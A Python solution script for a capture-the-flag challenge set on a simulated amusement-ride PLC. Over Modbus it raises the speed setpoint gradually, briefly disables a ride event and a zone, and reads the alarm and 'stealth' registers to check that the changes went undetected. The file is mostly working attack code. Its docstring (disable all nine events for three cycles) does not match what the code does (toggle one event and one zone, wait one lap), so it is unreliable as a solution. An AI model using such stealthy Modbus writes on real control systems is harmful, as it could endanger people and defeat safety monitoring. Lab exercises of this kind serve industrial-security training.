#!/usr/bin/env python3
"""
CTF Challenge 10: Ghost Mode
Difficulty: Expert
Points: 500

Objective: Complete 3 full cycles with all 9 events disabled simultaneously

Requirements:
- Disable all 9 events while the ride is running
- Maintain ride operation for 3 complete cycles
- The web interface will detect this achievement and award the flag

Solution: Requires disabling every event while maintaining ride operation
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_10_ghost_mode.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 10: Ghost in the Machine")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Failed to connect")
        sys.exit(1)

    print("[+] Connected")
    print("[*] This challenge requires perfect stealth...")
    print("[*] We must modify 3+ parameters without detection")
    print()

    # Read initial values
    print("[*] Reading initial state...")
    cycle_start = client.read_holding_registers(2051, 2)  # MD3 - cycle_counter
    alarm_start = client.read_holding_registers(1054, 1)  # MW30 - alarm_register
    stealth_start = client.read_holding_registers(1055, 1)  # MW31 - stealth_counter

    if not (cycle_start.isError() or alarm_start.isError() or stealth_start.isError()):
        initial_cycles = cycle_start.registers[1]  # Lower word of DINT
        initial_alarm = alarm_start.registers[0]
        initial_stealth = stealth_start.registers[0]

        print(f"[*] Initial cycles: {initial_cycles}")
        print(f"[*] Initial alarm: {initial_alarm}")
        print(f"[*] Initial stealth: {initial_stealth}")
    else:
        print("[!] Failed to read initial values")
        client.close()
        sys.exit(1)

    print("\n[*] Executing stealth operations...")

    # Action 1: Gradually change speed (avoid big jumps)
    print("[*] Action 1: Smoothly adjusting speed...")
    current_speed = client.read_holding_registers(0, 1)  # speed_setpoint
    if not current_speed.isError():
        speed = current_speed.registers[0]
        target_speed = min(speed + 15, 100)  # Small increment
        
        # Ramp slowly
        for s in range(speed, target_speed, 2):
            client.write_register(0, s)
            time.sleep(0.2)
        print(f"[+] Speed ramped from {speed} to {target_speed}")

    # Action 2: Briefly disable an event in a safe zone
    print("[*] Action 2: Temporarily disabling Event 9...")
    client.write_coil(16, False)  # event_9_enable
    time.sleep(1)
    client.write_coil(16, True)  # Re-enable
    print("[+] Event 9 toggled")

    # Action 3: Modify zone briefly
    print("[*] Action 3: Temporarily adjusting Zone 3...")
    client.write_coil(7, False)  # zone_3_enable
    time.sleep(0.5)
    client.write_coil(7, True)  # Re-enable
    print("[+] Zone 3 toggled")

    print("\n[*] Waiting for lap to complete...")
    print("[*] Monitoring detection systems...")

    # Wait for cycle to increment
    timeout = 60
    start_time = time.time()

    while (time.time() - start_time) < timeout:
        cycle_now = client.read_holding_registers(2051, 2)
        alarm_now = client.read_holding_registers(1054, 1)
        stealth_now = client.read_holding_registers(1055, 1)

        if not (cycle_now.isError() or alarm_now.isError() or stealth_now.isError()):
            current_cycles = cycle_now.registers[1]
            current_alarm = alarm_now.registers[0]
            current_stealth = stealth_now.registers[0]

            print(f"\r[*] Cycles: {current_cycles} | Alarm: {current_alarm} | Stealth: {current_stealth}", 
                  end="", flush=True)

            # Check if lap completed
            if current_cycles > initial_cycles:
                print("\n\n[*] Lap completed!")
                print(f"[*] Final alarm: {current_alarm}")
                print(f"[*] Final stealth: {current_stealth}")

                if current_alarm == 0 and current_stealth == 0:
                    print("\n[+] PERFECT STEALTH ACHIEVED!")
                    print("[+] All modifications made without detection!")
                    print("[*] Check the web interface for flag capture notification")
                else:
                    print("\n[!] Detection occurred")
                    print(f"[!] Alarm delta: {current_alarm - initial_alarm}")
                    print(f"[!] Stealth delta: {current_stealth - initial_stealth}")
                break

        time.sleep(0.5)

    client.close()

if __name__ == "__main__":
    main()
